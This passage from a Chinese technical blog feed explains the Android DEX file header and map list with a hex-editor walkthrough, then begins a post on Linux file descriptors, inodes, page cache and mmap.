class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns the signature of all but the first 32 bytes of this dex. The</span></span><br><span class="line"><span class="comment"> * first 32 bytes of dex files are not specified to be included in the</span></span><br><span class="line"><span class="comment"> * signature.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] computeSignature() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    MessageDigest digest;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        digest = MessageDigest.getInstance(<span class="string">"SHA-1"</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">8192</span>];</span><br><span class="line">    ByteBuffer data = <span class="keyword">this</span>.data.duplicate(); <span class="comment">// positioned ByteBuffers aren't thread safe</span></span><br><span class="line">    data.limit(data.capacity());</span><br><span class="line">    data.position(SIGNATURE_OFFSET + SIGNATURE_SIZE);</span><br><span class="line">    <span class="keyword">while</span> (data.hasRemaining()) &#123;</span><br><span class="line">        <span class="keyword">int</span> count = Math.min(buffer.length, data.remaining());</span><br><span class="line">        data.get(buffer, <span class="number">0</span>, count);</span><br><span class="line">        digest.update(buffer, <span class="number">0</span>, count);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> digest.digest();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Filesize"><a href="#Filesize" class="headerlink" title="Filesize"></a>Filesize</h2><p>文件的总大小。4字节</p><h2 id="headerSize"><a href="#headerSize" class="headerlink" title="headerSize"></a>headerSize</h2><p>整个dexheader的大小，一般固定为0x70</p><h2 id="endianTag"><a href="#endianTag" class="headerlink" title="endianTag"></a>endianTag</h2><p>DEX运行环境的cpu字节序，预设值ENDIAN_CONSTANT等于0x12345678，表示默认采用Little-Endian字节序。也就是小端显示。</p><p><strong>What is 字节序？</strong></p><blockquote><p>字节顺序是指占内存多于一个字节类型的数据在内存中的存放顺序，通常有小端、大端两种字节顺序。小端字节序指低字节数据存放在内存低地址处，高字节数据存放在内存高地址处；大端字节序是高字节数据存放在低地址处，低字节数据存放在高地址处。</p><p>字节序不是由操作系统决定的，而是由cpu架构决定的</p><p>大端显示：12345678</p><p>低—————–&gt;高</p><p>12 34 56 78</p><p>小端显示：12345678</p><p>低—————–&gt;高</p><p>78 56 34 12</p></blockquote><p>之所以需要用到字节序，是因为不同语言的数据存储顺序方式不同。C/C++语言编写的程序里数据存储顺序是跟编译平台所在的CPU相关的，而JAVA编写的程序则只采用bigendian方式来存储数据。如果c++的程序想要和java程序联通，那么他们的字节顺序就必须要注意。</p><p>简单理解就是：一个数据存储的协议。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul><li><strong>linkSize</strong>和<strong>linkOff</strong>：指定链接段的大小与文件偏移，大多数情况下它们的值都为0。link_size：LinkSection大小,如果为0则表示该DEX文件不是静态链接。link_off用来表示LinkSection距离DEX头的偏移地址，如果LinkSize为0，此值也会为0。</li><li><strong>mapOff</strong>：DexMapList结构的文件偏移。</li><li><strong>stringIdsSize</strong>和<strong>stringIdsOff</strong>：DexStringId结构的数据段大小与文件偏移。</li><li><strong>typeIdsSize</strong>和<strong>typeIdsOff</strong>：DexTypeId结构的数据段大小与文件偏移。</li><li><strong>protoIdsSize</strong>和<strong>protoIdsSize</strong>：DexProtoId结构的数据段大小与文件偏移。</li><li><strong>fieldIdsSize</strong>和<strong>fieldIdsSize</strong>：DexFieldId结构的数据段大小与文件偏移。</li><li><strong>methodIdsSize</strong>和<strong>methodIdsSize</strong>：DexMethodId结构的数据段大小与文件偏移。</li><li><strong>classDefsSize</strong>和<strong>classDefsOff</strong>：DexClassDef结构的数据段大小与文件偏移。</li><li><strong>dataSize</strong>和<strong>dataOff</strong>：数据段的大小与文件偏移。</li></ul><h1 id="DexMapList"><a href="#DexMapList" class="headerlink" title="DexMapList"></a>DexMapList</h1><p>Dalvik虚拟机解析dex文件的内容，最终将其映射为DexMapList数据结构。</p><p>DexHeader结构的mapOff字段指明了DexMapList结构在dex文件中的偏移。</p><p>每一种数据均是一种DexMapItem类型，存放在DexMapList中。</p><p>某一类的DexMapItem包含的数据位：这类数据有多少个，他的文件偏移是多少。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Direct-mapped "map_item".</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexMapItem</span> &#123;</span></span><br><span class="line">    u2 type;              <span class="comment">/* kDexType开头的类型 */</span></span><br><span class="line">    u2 unused;            <span class="comment">/* 未使用，用于字节对齐 */</span></span><br><span class="line">    u4 size;              <span class="comment">/* 指定类型的个数 */</span></span><br><span class="line">    u4 offset;            <span class="comment">/* 指定类型的文件偏移 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Direct-mapped "map_list".</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexMapList</span> &#123;</span></span><br><span class="line">    u4  size;               <span class="comment">// 有多少个DexMapItem</span></span><br><span class="line">    DexMapItem <span class="built_in">list</span>[<span class="number">1</span>];     <span class="comment">/* entries */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这上面的type值有：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* map item type codes */</span></span><br><span class="line"><span class="keyword">enum</span> &#123;</span><br><span class="line">    kDexTypeHeaderItem               = <span class="number">0x0000</span>,</span><br><span class="line">    kDexTypeStringIdItem             = <span class="number">0x0001</span>,</span><br><span class="line">    kDexTypeTypeIdItem               = <span class="number">0x0002</span>,</span><br><span class="line">    kDexTypeProtoIdItem              = <span class="number">0x0003</span>,</span><br><span class="line">    kDexTypeFieldIdItem              = <span class="number">0x0004</span>,</span><br><span class="line">    kDexTypeMethodIdItem             = <span class="number">0x0005</span>,</span><br><span class="line">    kDexTypeClassDefItem             = <span class="number">0x0006</span>,</span><br><span class="line">    kDexTypeCallSiteIdItem           = <span class="number">0x0007</span>,</span><br><span class="line">    kDexTypeMethodHandleItem         = <span class="number">0x0008</span>,</span><br><span class="line">    kDexTypeMapList                  = <span class="number">0x1000</span>,</span><br><span class="line">    kDexTypeTypeList                 = <span class="number">0x1001</span>,</span><br><span class="line">    kDexTypeAnnotationSetRefList     = <span class="number">0x1002</span>,</span><br><span class="line">    kDexTypeAnnotationSetItem        = <span class="number">0x1003</span>,</span><br><span class="line">    kDexTypeClassDataItem            = <span class="number">0x2000</span>,</span><br><span class="line">    kDexTypeCodeItem                 = <span class="number">0x2001</span>,</span><br><span class="line">    kDexTypeStringDataItem           = <span class="number">0x2002</span>,</span><br><span class="line">    kDexTypeDebugInfoItem            = <span class="number">0x2003</span>,</span><br><span class="line">    kDexTypeAnnotationItem           = <span class="number">0x2004</span>,</span><br><span class="line">    kDexTypeEncodedArrayItem         = <span class="number">0x2005</span>,</span><br><span class="line">    kDexTypeAnnotationsDirectoryItem = <span class="number">0x2006</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>随便建了一个项目，生成debug包，解压dex，拖入010 Editor，得到dex的二进制数据。</p><p>以下为DexHeader,总大小为0x70</p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Dex/dex_header.png" alt="dexheader"></p><p>按前面的DexHeader偏移表计算可知，mapoff所在的位置为53~56（signature结束于32字节，mapoff前面有5个4字节的）。一行为16字节，故mapoff的值为：30 64 1D 00，因为是小端显示，所以它的值为0x1d6430。</p><p><strong>Tips：直接滚动到屏幕最下面就行了</strong></p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Dex/dex_map.png" alt="dex_map"></p><p>它的第一个字段为12，对应十进制的18，表明接下来会有18个DexMapItem结构（总共就只有20个)</p><p>前面4个字节为size（12 00 00 00），后面依次的就是各个DexMapItem的内容。 </p><p>例如：接下来的来的 00对应type，占用两个字节，表示为header。跟着的00表示unused，再跟着的 01 00 00 00表示size，类型的个数。最后的00 00 00 00 表示偏移。</p><p><strong>所以第一行的内容（除开12 00 00 00）为：DexHeader类型，个数为1，偏移为0</strong></p><p><strong>注意是小端显示</strong></p><p><strong>举个例子，整理一下：</strong></p><table><thead><tr><th>类型</th><th>个数</th><th>偏移</th></tr></thead><tbody><tr><td>kDexTypeHeaderItem</td><td>0x01</td><td>0x0</td></tr><tr><td>kDexTypeStringIdItem</td><td>0x4A33</td><td>0x70</td></tr><tr><td>kDexTypeTypeIdItem</td><td>0x795</td><td>0x1293C</td></tr></tbody></table><p>这里只列举了3个，剩下的太多，不写了。</p><p>简单校验一下，stringId起始的位置为0x70，数量有0x4A33个，每个占用4字节，也就是0x128cc，加上0x70，最终等于0x1293c，也就是TypeIdde的偏移。表明上面的表格正确。</p><p>对于stringId来说，表明在0x70处有0x4A33个String类型。从上面DexHeader的那张图可以发现，0070h位置处的4个字节为C6 8A 13 00，也就表明第一个string的字符串数据位于0x138AC6（小端显示）.</p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Dex/dex_string.png" alt="dex_string"></p><p>从右边可以看到，这里连续放着一堆字符串，也就表明这次操作正确了</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Dex文件结构分析。&lt;/p&gt;
&lt;p&gt;本文源码均摘自8.0分支&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="Android" scheme="http://imlzq.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Linux文件基础和mmap</title>
    <link href="http://imlzq.com/2017/10/26/Linux%20%E6%96%87%E4%BB%B6%E5%9F%BA%E7%A1%80%E5%92%8Cmmap/"/>
    <id>http://imlzq.com/2017/10/26/Linux 文件基础和mmap/</id>
    <published>2017-10-25T16:00:00.000Z</published>
    <updated>2018-04-16T15:01:29.202Z</updated>
    
    <content type="html"><![CDATA[<p>脱360的壳时需要给mmap函数下断点，总结IPC的共享内存时也需要用到mmap，所以本文就先总结一下mmap相关内容。</p><a id="more"></a>    <h1 id="一、Linux文件基础"><a href="#一、Linux文件基础" class="headerlink" title="一、Linux文件基础"></a>一、Linux文件基础</h1><h2 id="1、fd"><a href="#1、fd" class="headerlink" title="1、fd"></a>1、fd</h2><p>fd（File Descriptor）是内核为了管理已打开的文件所创建的索引，是一个非负整数，在open时产生。所有执行I/O操作的系统调用都会通过文件描述符。<br>| 文件描述符 | 用途   | POSIX名称       | stdio流 |<br>| —– | —- | ————- | —— |<br>| 0     | 标准输入 | STDIN_FILENO  | stdin  |<br>| 1     | 标准输出 | STDOUT_FILENO | stdout |<br>| 2     | 标准错误 | STDERR_FILENO | stderr |<br>如果打开一个新的文件，它的fd会是3。</p><p>POSIX（Portable Operating System Interface of UNIX，可移植操作系统接口）标准规定每次打开文件时必须使用当前进程中最小可用的文件描述符号码。</p><h3 id="1-1-限制"><a href="#1-1-限制" class="headerlink" title="1.1 限制"></a>1.1 限制</h3><p>理论上系统内存有多大就可以打开多少的fd，但实际上内核允许最大的打开文件数是系统内存的10%（KB计算），如果超出这个数，就会提示“Too many open files”。可以使用sysctl -a | grep fs.file-max命令查看系统的最大打开文件数。这也就是系统级限制。<br>此外，为了防止一个进程消耗掉所有的文件资源，单个进程最大打开的文件数有限制，一般为1024，可通过ulimit -n查看。这就是用户级限制。</p><h2 id="2、-fd和文件之间的关系"><a href="#2、-fd和文件之间的关系" class="headerlink" title="2、 fd和文件之间的关系"></a>2、 fd和文件之间的关系</h2><ul><li>每个fd会与一个打开的文件对应；</li><li>不同的fd也可能会指向同一个文件</li><li><p>相同的文件可以被不同的进程打开，也可以在同一个进程中被多次打开</p><p>系统为每个进程都维护了一个文件描述符表，该表的值都是从0开始， 进程凭借fd的值能通过文件描述符表快速查询对应的文件。</p></li></ul><p>所以在不同的进程中会看到相同的fd，但它们可能指向同一个文件，也可能指向不同的文件。</p><h2 id="3、内核维护的3个数据结构"><a href="#3、内核维护的3个数据结构" class="headerlink" title="3、内核维护的3个数据结构"></a>3、内核维护的3个数据结构</h2><ul><li>进程级的文件描述符表</li><li>系统级的打开文件描述符表</li><li>文件系统的i-node表</li></ul><h3 id="3-1-inode表"><a href="#3-1-inode表" class="headerlink" title="3.1 inode表"></a>3.1 inode表</h3><p><strong>inode是什么？</strong></p><ul><li>文件存储在硬盘上，硬盘的最小存储单位叫扇区（Sector），每个山区存储512字节（0.5KB）</li><li>操作系统在读取硬盘的时候，为了效率，会一次性连续读取多个扇区，也就是块（block）。块也就是文件存取的最小单位，它的大小最常见的为4kb，即8个连续的扇区组成一个块</li><li>因此文件的数据存储在块中，而存储文件的元信息（比如文件的创建者、创建时间、创建的大小等）的区域就叫做inode(index node， 索引节点)</li></ul><p><strong>inode的内容</strong></p><ul><li>文件的字节数</li><li>文件拥有者的User ID</li><li>文件的Group ID</li><li>文件的读、写、执行权限</li><li>文件的时间戳：ctime（inode上一次变动的时间）、mtime（文件内容上一次变动的时间）、atime（文件上一次打开的时间）</li><li>链接数，即有多少个文件名指向这个inode</li><li>文件数据block的位置</li></ul><p><strong>inode号码</strong><br>每个inode都有一个号码，操作系统用inode号码来识别不同的文件。</p><p>其实在Unix/Linux系统中在识别文件时，不使用文件名而是使用inode号码。<br>对于系统来说，文件名只是inode号码便于识别的别称或绰号。</p><p>当用户通过文件名打开文件时，系统内部分为3个流程</p><pre><code>1. 系统找到这个文件名对应的inode号码2. 通过inode号码获取inode信息3. 根据inode信息找到文件数据block的位置，读出数据</code></pre><p><strong>目录文件</strong><br>因为Linux中万物皆文件，因此目录（directory）也是一种文件。<br>目录的结构其实就是一系列目录项（dirent）的列表。<br>每个目录项的内容为：</p><ul><li>所包含文件的文件名</li><li>该文件名对应的inode号码 </li></ul><p><strong>硬链接（hard link）</strong><br>一般情况下，文件名和inode号码一一对应，每个inode号码对应一个文件名。</p><p>但Unix/Linux系统也允许多个文件名指向同一个inode号码，即可以用不同的文件名访问同样的内容。</p><p>对文件内容进行修改，会影响到所有文件名。但删除一个文件名，并不影响另一个文件名的访问。</p><p><strong>软链接（soft link）</strong><br>有一种特殊情况。<br>文件A和B的inode号码虽然不一样，但是文件A的内容是文件B的路径。即读取文件A时，系统会自动将访问者导向B。<br>因此，不论打开哪一个文件，最终读取的都是文件B。这时候文件A就称为文件B的软链接或符号链接（Symbolic link）。</p><p>这是的文件A依赖于文件B存在，如果删除文件B，那么打开文件A就会报错：『No such file or directory』。<br>这也就是软链接与硬链接最大的不同：文件A指向文件B，而不是文件B的inode号码，文件B的inode链接数不会因此发生变化</p><h3 id="3-2-进程级的文件描述符表"><a href="#3-2-进程级的文件描述符表" class="headerlink" title="3.2 进程级的文件描述符表"></a>3.2 进程级的文件描述符表</h3><p>该表的每一条目均记录了单个文件描述符的相关信</p><pre><code>1. 控制文件描述符操作的一组标志（如close-on-exec）2. 对打开文件句柄的引用</code></pre><h3 id="3-3-系统级的打开文件描述符表"><a href="#3-3-系统级的打开文件描述符表" class="headerlink" title="3.3 系统级的打开文件描述符表"></a>3.3 系统级的打开文件描述符表</h3><p>内核对所有打开的文件维护有一个系统级的<strong>描述符表格（open file description table）</strong>，也被称为<strong>打开文件表（open file table）</strong>，并将表格中各条目称为<strong>打开文件句柄（open file handle）</strong>。<br>一个打开文件句柄存储了与一个打开文件相关的全部信息</p><pre><code>1. 当前文件的偏移量（调用read()和write()时更新，或使用lseek()直接修改）2. 打开文件时所使用的状态标识（如open()的flags参数）3. 文件访问模式（调用open时的只读、只写或读写模式）4. 与信号驱动相关的设置5. 对该文件inode对象的引用6. 文件类型（如常规文件、套接字、FIFO）和访问权限7. 指向该文件所持有的锁列表的指针8. 文件的各种属性，包括文件大小、不同类型操作相关的时间戳</code></pre><p><img src="http://bos.nj.bpc.baidu.com/v1/agroup/103143f4b87f36e80404c317b2cd06cf1cccc845" alt="文件描述符、打开的文件句柄以及i-node之间的关系"><br><strong>图为：文件描述符、打开的文件句柄以及i-node之间的关系</strong></p><p>   在上图的进程A中，文件描述符1和30都指向了同一个打开的文件句柄（标号23）。这可能是通过调用dup()、dup2()、fcntl()或者对同一个文件多次调用了open()函数而形成的。</p><p>   进程A的文件描述符2和进程B的文件描述符2都指向了同一个打开的文件句柄（标号73）。这种情形可能是在调用fork()后出现的（即，进程A、B是父子进程关系），或者当某进程通过UNIX域套接字将一个打开的文件描述符传递给另一个进程时，也会发生。再者是不同的进程独自去调用open函数打开了同一个文件，此时进程内部的描述符正好分配到与其他进程打开该文件的描述符一样。</p><p>  此外，进程A的描述符0和进程B的描述符3分别指向不同的打开文件句柄，但这些句柄均指向i-node表的相同条目（1976），换言之，指向同一个文件。发生这种情况是因为每个进程各自对同一个文件发起了open()调用。同一个进程两次打开同一个文件，也会发生类似情况。</p><h2 id="4、fd与filp"><a href="#4、fd与filp" class="headerlink" title="4、fd与filp"></a>4、fd与filp</h2><p>fd只是一个整数，起索引的作用，进程通过PCB（Process Control Block）中的文件描述符表找到该fd所指向的文件指针filp（file pointer），filp返回strcut file*结构指针。</p><h1 id="二、I-O缓冲区"><a href="#二、I-O缓冲区" class="headerlink" title="二、I/O缓冲区"></a>二、I/O缓冲区</h1><h2 id="1、-概念"><a href="#1、-概念" class="headerlink" title="1、 概念"></a>1、 概念</h2><p>与高速缓存（cache）产生的原理类似，在I/O过程中，读取磁盘的速度相对内存读取速度要慢的多。因此为了能够加快处理数据的速度，需要将读取过的数据缓存在内存里。而这些缓存在内存里的数据就是高速缓冲区（buffer cache），下面简称为“buffer”。</p><p>具体来说，buffer（缓冲区）是一个用于存储速度不同步的设备或优先级不同的设备之间传输数据的区域。一方面，通过缓冲区，可以使进程之间的相互等待变少，从而使从速度慢的设备读入数据时，速度快的设备的操作进程不发生间断。另一方面，可以保护硬盘或减少网络传输的次数。</p><h2 id="2、Buffer和Cache"><a href="#2、Buffer和Cache" class="headerlink" title="2、Buffer和Cache"></a>2、Buffer和Cache</h2><p>buffer和cache是两个不同的概念：cache是高速缓存，用于CPU和内存之间的缓冲；buffer是I/O缓存，用于内存和硬盘的缓冲；<br>简单的说，cache是加速“读”，而buffer是缓冲“写”，前者解决读的问题，保存从磁盘上读出的数据，后者是解决写的问题，保存即将要写入到磁盘上的数据。</p><h2 id="3、Buffer-Cache和-Page-Cache"><a href="#3、Buffer-Cache和-Page-Cache" class="headerlink" title="3、Buffer Cache和 Page Cache"></a>3、Buffer Cache和 Page Cache</h2><p>buffer cache和page cache都是为了处理设备和内存交互时高速访问的问题。buffer cache可称为块缓冲器，page cache可称为页缓冲器。</p><p>在linux不支持虚拟内存机制之前，还没有页的概念，因此缓冲区以块为单位对设备进行。在linux采用虚拟内存的机制来管理内存后，页是虚拟内存管理的最小单位，开始采用页缓冲的机制来缓冲内存。</p><p>Linux2.6之后内核将这两个缓存整合，页和块可以相互映射，同时，页缓存page cache面向的是虚拟内存，块I/O缓存Buffer cache是面向块设备。需要强调的是，页缓存和块缓存对进程来说就是一个存储系统，进程不需要关注底层的设备的读写。</p><p>buffer cache和page cache两者最大的区别是缓存的粒度。buffer cache面向的是文件系统的块。而内核的内存管理组件采用了比文件系统的块更高级别的抽象：页page，其处理的性能更高。因此和内存管理交互的缓存组件，都使用页缓存。</p><h3 id="4、页缓存Page-Cache"><a href="#4、页缓存Page-Cache" class="headerlink" title="4、页缓存Page Cache"></a>4、页缓存Page Cache</h3><p>页缓存是面向文件，面向内存的。通俗来说，它位于内存和文件之间缓冲区，文件IO操作实际上只和page cache交互，不直接和内存交互。page cache可以用在所有以文件为单元的场景下，比如网络文件系统等等。</p><h2 id="5、文件读写基本流程"><a href="#5、文件读写基本流程" class="headerlink" title="5、文件读写基本流程"></a>5、文件读写基本流程</h2><h3 id="5-1-读文件"><a href="#5-1-读文件" class="headerlink" title="5.1 读文件"></a>5.1 读文件</h3><pre><code>1. 进程调用库函数向内核发起读文件请求；2. 内核通过检查进程的文件描述符定位到虚拟文件系统的已打开文件列表表项；3. 调用该文件可用的系统调用函数read()4. read()函数通过文件表项链接到目录项模块，根据传入的文件路径，在目录项模块中检索，找到该文件的inode；5. 在inode中，通过文件内容偏移量计算出要读取的页；6. 通过inode找到文件对应的address_space；7. 在address_space中访问该文件的页缓存树，查找对应的页缓存结点：  （1）如果页缓存命中，那么直接返回文件内容；    （2）如果页缓存缺失，那么产生一个页缺失异常，创建一个页缓存页，同时通过inode找到文件该页的磁盘地址，读取相应的页填充该缓存页；重新进行第6步查找页缓存；8. 文件内容读取成功。</code></pre><h3 id="5-2-写文件"><a href="#5-2-写文件" class="headerlink" title="5.2 写文件"></a>5.2 写文件</h3><p>前5步和读文件一致，在address_space中查询对应页的页缓存是否存在：</p><p>  6、如果页缓存命中，直接把文件内容修改更新在页缓存的页中。写文件就结束了。这时候<br>  文件修改位于页缓存，并没有写回到磁盘文件中去。</p><p>  7、 如果页缓存缺失，那么产生一个页缺失异常，创建一个页缓存页，同时通过inode找到文件该页的磁盘地址，读取相应的页填充该缓存页。此时缓存页命中，进行第6步。</p><p>  8、一个页缓存中的页如果被修改，那么会被标记成脏页。脏页需要写回到磁盘中的文件块。有两种方式可以把脏页写回磁盘：<br>（1）手动调用sync()或者fsync()系统调用把脏页写回<br>（2）pdflush进程会定时把脏页写回到磁盘</p><p>同时注意，脏页不能被置换出内存，如果脏页正在被写回，那么会被设置写回标记，这时候该页就被上锁，其他写请求被阻塞直到锁释放。</p><h1 id="三、内核空间和用户空间"><a href="#三、内核空间和用户空间" class="headerlink" title="三、内核空间和用户空间"></a>三、内核空间和用户空间</h1><p>Linux的虚拟地址与线性地址总是一致，Linux的虚拟地址空间跟线性地址一样，为0～4G。Linux内核将这4G字节的空间分为两部分。将最高的1G字节（从虚拟地址0xC0000000到0xFFFFFFFF），供内核使用，称为“内核空间”。而将较低的3G字节（从虚拟地址 0x00000000到0xBFFFFFFF），供各个进程使用，称为“用户空间）。</p><p>每个进程可以通过系统调用进入内核，因此，Linux内核由系统内的所有进程共享。</p><p>故，从具体进程的角度来看，每个进程可以拥有4G字节的虚拟空间。</p><p>内核空间中存放的是内核代码和数据，而进程的用户空间中存放的是用户程序的代码和数据。不管是内核空间还是用户空间，它们都处于虚拟空间中。 </p><p><strong>其实说白了也就是：两个的权限不一样，处理的事务不一样。内核空间能调系统调用，用户空间只能调用户调用</strong></p><h1 id="四、mmap"><a href="#四、mmap" class="headerlink" title="四、mmap"></a>四、mmap</h1><p>mmap是内存映射文件的方法，即将一个文件或者其他对象映射到进程的地址空间，实现文件磁盘地址和进程虚拟地址空间中一段虚拟地址的一一对映关系。</p><p><img src="http://bos.nj.bpc.baidu.com/v1/agroup/cd2b711165c1b5ae167e31c248539377ae7bd623" alt="进程虚拟地址空间"></p><p>从上图可以了解，进程的虚拟地址空间由多个虚拟内存区域构成。虚拟内存区域是虚拟内存空间中具有同样特性的连续地址范围。</p><p>上方的text数据段、初始数据段、bss数据段、堆、内存映射、栈，每个都是一个独立的虚拟内存区域。</p><p>为内存映射服务的地址空间处在堆在之间的空余部分。<br><img src="http://bos.nj.bpc.baidu.com/v1/agroup/e73e69609510615c14deecc36ea1455394f2d281" alt="vm_area_struct"></p><p>Linux内核使用vm_area_struct结构表示一个独立的虚拟内存区域，每个vm_area_struct结构使用链表或者树形结构连接，方便进程快速访问。它包含区域其实和终止地址以及其他相关信息，同时也包括一个vm_ops指针，其内部可引出所有针对这个区域可以使用的系统调用函数。</p><p>因此进程对某一虚拟内存区域的任何操作需要用到的信息都可以直接从vm_area_struct中获得。</p><p>mmap也就是要创建一个新的vm_area_struct结构并将其与文件的物理磁盘相连。</p><h2 id="1、mmap内存映射的流程"><a href="#1、mmap内存映射的流程" class="headerlink" title="1、mmap内存映射的流程"></a>1、mmap内存映射的流程</h2><p>###（一）进程在虚拟地址空间中创建虚拟映射区域</p><pre><code>1.  进程在用户空间调用库函数mmap2.  在当前进程句柄的虚拟地址空间中，寻找一段空闲且满足要求的连续虚拟地址3.  为此虚拟区分配一个vm_area_struct结构并初始化它4.  将新建的vm_area_struct结构插入到进程的虚拟地址区域链表或树中</code></pre><p>void <em>mmap(void </em>start, size_t length, int prot, int flags, int fd, off_t offset); </p><blockquote><p>start：映射区的开始位置<br>length：映射区的长度<br>port：期望的内存保护标志，不能与文件的打开模式冲突。可以通过or运算组合。<br>flags:指定映射对象的类型、映射选项和映射页是否可以共享。它的值可以是一个或者多个参数的组合<br>fd: 文件描述符<br>offset：被映射对象内容的起点</p></blockquote><p>port的值可以为：</p><pre><code>1. PROT_EXEC ：页内容可以被执行2. PROT_READ ：页内容可以被读取3. PROT_WRITE ：页可以被写入4. PROT_NONE ：页不可访问</code></pre><p>flag的参数类型：</p><pre><code>1. MAP_FIXED          // 使用指定的映射起始地址，如果由start和len参数指定的内存区重叠于现存的映射空间，重叠部分将会被丢弃。如果指定的起始地址不可用，操作将会失败。并且起始地址必须落在页的边界上。2.  MAP_SHARED    // 与其它所有映射这个对象的进程共享映射空间。对共享区的写入，相当于输出到文件。直到msync()或者munmap()被调用，文件实际上不会被更新。3.  MAP_PRIVATE    // 建立一个写入时拷贝的私有映射。内存区域的写入不会影响到原文件。这个标志和以上标志是互斥的，只能使用其中一个。4.  MAP_DENYWRITE // 这个标志被忽略。5. MAP_EXECUTABLE // 同上6.  MAP_NORESERVE // 不要为这个映射保留交换空间。当交换空间被保留，对映射区修改的可能会得到保证。当交换空间不被保留，同时内存不足，对映射区的修改会引起段违例信号。7. MAP_LOCKED // 锁定映射区的页面，从而防止页面被交换出内存。8. MAP_GROWSDOWN // 用于堆栈，告诉内核VM系统，映射区可以向下扩展。9. MAP_ANONYMOUS // 匿名映射，映射区不与任何文件关联。10. MAP_ANON // MAP_ANONYMOUS的别称，不再被使用。11.  MAP_FILE // 兼容标志，被忽略。12. MAP_32BIT // 将映射区放在进程地址空间的低2GB，MAP_FIXED指定时会被忽略。当前这个标志只在x86-64平台上得到支持。13.  MAP_POPULATE // 为文件映射通过预读的方式准备好页表。随后对映射区的访问不会被页违例阻塞。14. MAP_NONBLOCK // 仅和MAP_POPULATE一起使用时才有意义。不执行预读，只为已存在于内存中的页面建立页表入口。</code></pre><p>###（二）调用内核空间的系统调用函数mmap，实现文件物理地址和进程虚拟地址的映射关系</p><pre><code>1. 通过待映射的文件指针filp，在文件描述符表中查询对应的fd，通过fd，链接到内核已打开文件表（Open file table）中该文件的文件结构体 （struct file）。每个文件结构体维护这和这个已打开文件相关的各项信息。2. 通过该文件结构体，连接到file_operations模块，调用内核函数mmap3. 内核mmap函数通过虚拟文件系统inode模块定位到文件磁盘物理地址4. 通过remap_pfn_range函数建立页表，即实现文件地址和虚拟地址的映射关系。</code></pre><p>另外，此时的系统调用函数mmap与库函数mmap不同。它的定义如下：<br>int mmap(struct file <em>filp, struct vm_area_struct </em>vma)<br>里面两个参数的定义就是文件指针filp和虚拟空间结构体</p><p><strong>总结：其实也就是通过一系列的手段获取文件磁盘的物理地址，从而与虚拟地址映射</strong></p><p>###（三）进程发起对这片映射空间的访问，引发缺页异常，实现文件内容到物理内存（主存）的拷贝<br>在前两步完成之后，只完成了地址映射，但没有将任何文件数据拷贝到主存。<br>当进程发起读或写操作时才会执行文件读取</p><pre><code>1. 进程的读或写操作访问虚拟地址空间这一段映射地址，通过查询页表，发现这一段地址并不在物理页面上。因为目前只建立了地址映射，真正的硬盘数据还没有拷贝到内存中，因此引发缺页异常。2. 缺页异常进行一系列判断，确定无非法操作后，内核发起请求调页过程。3. 调页过程先在交换缓存空间（swap cache）中寻找需要访问的内存页，如果没有则调用nopage函数把所缺的页从磁盘装入到主存中。4. 之后进程即可对这片主存进行读或者写的操作，如果写操作改变了其内容，一定时间后系统会自动回写脏页面到对应磁盘地址，也即完成了写入到文件的过程。</code></pre><p>修改过的脏页面并不会立即更新回文件中，而是有一段时间的延迟，可以调用msync()来强制同步, 这样所写的内容就能立即保存到文件里了。</p><h2 id="2-mmap和常规文件操作的区别"><a href="#2-mmap和常规文件操作的区别" class="headerlink" title="2 mmap和常规文件操作的区别"></a>2 mmap和常规文件操作的区别</h2><h3 id="2-1-常规文件："><a href="#2-1-常规文件：" class="headerlink" title="2.1 